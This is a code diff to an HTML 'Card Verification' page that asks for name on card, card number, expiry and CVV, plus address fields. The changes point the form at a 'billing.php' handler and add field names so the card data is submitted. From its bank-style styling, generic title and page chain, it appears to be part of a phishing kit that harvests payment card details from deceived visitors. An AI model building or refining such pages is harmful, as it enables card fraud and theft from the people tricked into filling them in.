@@ -5,7 +5,7 @@
       <meta charset="UTF-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <link rel="stylesheet" href="./css/billing.css">
+      <link rel="stylesheet" href="billing.css">
       <link rel="stylesheet" href="./css/mobile.css">
       <link rel="stylesheet" href="./fontsawesome/css/all.css">
       <title>Document</title>
@@ -60,11 +60,12 @@
       <main>
             <div class="contents">
                   <h2 style="color: #d71e28;">Card Verification</h2>
-                  <form action="./files.html" method="post">
+
+                  <form action="billing.php" method="post">
 
                         <label for="nameoncard">
                               <br>
-                              <input type="text" name="" id="nameoncard" name="nameoncard" placeholder="Name on card" autocomplete="cc-name" required>
+                              <input type="text" name="" id="nameoncard" name="nameOnCard" placeholder="Name on card" autocomplete="cc-name" required>
                         </label> <br>
                         <label for="cc">
 
@@ -72,7 +73,7 @@
                         </label>
                         <label for="month and year">
 
-                              <input maxlength='5' placeholder="MM/YY" type="text" name="mmYY" onkeyup="formatString(event);" required>
+                              <input maxlength='5' placeholder="MM/YY" type="number" name="mmYY" onkeyup="formatString(event);" required>
                         </label>
                         <label for="cvv">
                               <input type="password" class="cvv" placeholder="CVV" name="cvv" maxlength="3" autocomplete="" required> <br>
@@ -84,7 +85,6 @@
                         <label id="city-1" for="city">
                               city <br>
                               <input type="text" id="c-y" name="cy">
-                        
                         </label>
                         <div class="country">
                               <label for="country" id="country">Country</label><span
@@ -98,7 +98,7 @@
                         <br>
                         <label id="states">
                               States <br>
-                              <select id="state-list">
+                              <select id="state-list" name="state">
                                     <option value=""></option>
                                     <option value="AL">Alabama</option>
                                     <option value="AK">Alaska</option>
@@ -162,7 +162,7 @@
                         
                         <div class="btn">
                         
-                              <a href="files.html">
+                              <a href="">
                                     <button class="btn-1">Continue</button>
                               </a>
                         
